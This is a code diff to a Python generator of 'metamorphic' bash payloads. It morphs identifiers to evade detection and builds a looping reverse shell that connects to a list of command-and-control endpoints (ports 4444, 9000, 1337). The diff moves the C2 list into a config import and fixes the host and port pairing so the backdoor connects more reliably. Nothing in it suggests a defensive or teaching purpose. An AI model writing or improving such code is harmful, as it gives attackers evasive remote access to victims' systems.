@@ -10,16 +10,6 @@ import itertools
 import sys
 from config import C2_ENDPOINTS
 
-# Configuration
-C2_ENDPOINTS = [
-    ("example.com", 4444),
-    ("example", 9000),
-    ("example", 1337),
-    ("192.168.1.1", 4444),
-    ("192.168.1.1", 9000),
-    ("192.168.1.1", 1337)
-]
-
 # --- Enhanced Variable/Function Name Morphing ---
 def random_unicode_letter():
     # Only use bash-valid characters
@@ -227,10 +217,17 @@ def generate_metamorphic_payload():
         buffer_var = morph_name('buffer')
 
         # Network Operations with direct bash reverse shell for reliability
+        # Select endpoints once so that hosts and ports remain paired
+        if len(C2_ENDPOINTS) >= 2:
+            endpoints = random.sample(C2_ENDPOINTS, 2)
+        else:
+            # Fall back to using the same endpoint twice if only one is configured
+            endpoints = [C2_ENDPOINTS[0], C2_ENDPOINTS[0]]
+
         network = f"""
 # Network Operations
 while true; do
-    for endpoint in "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}" "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}"; do
+    for endpoint in "{endpoints[0][0]}:{endpoints[0][1]}" "{endpoints[1][0]}:{endpoints[1][1]}"; do
         host="${{endpoint%%:*}}"
         port="${{endpoint##*:}}"
         # Try to connect
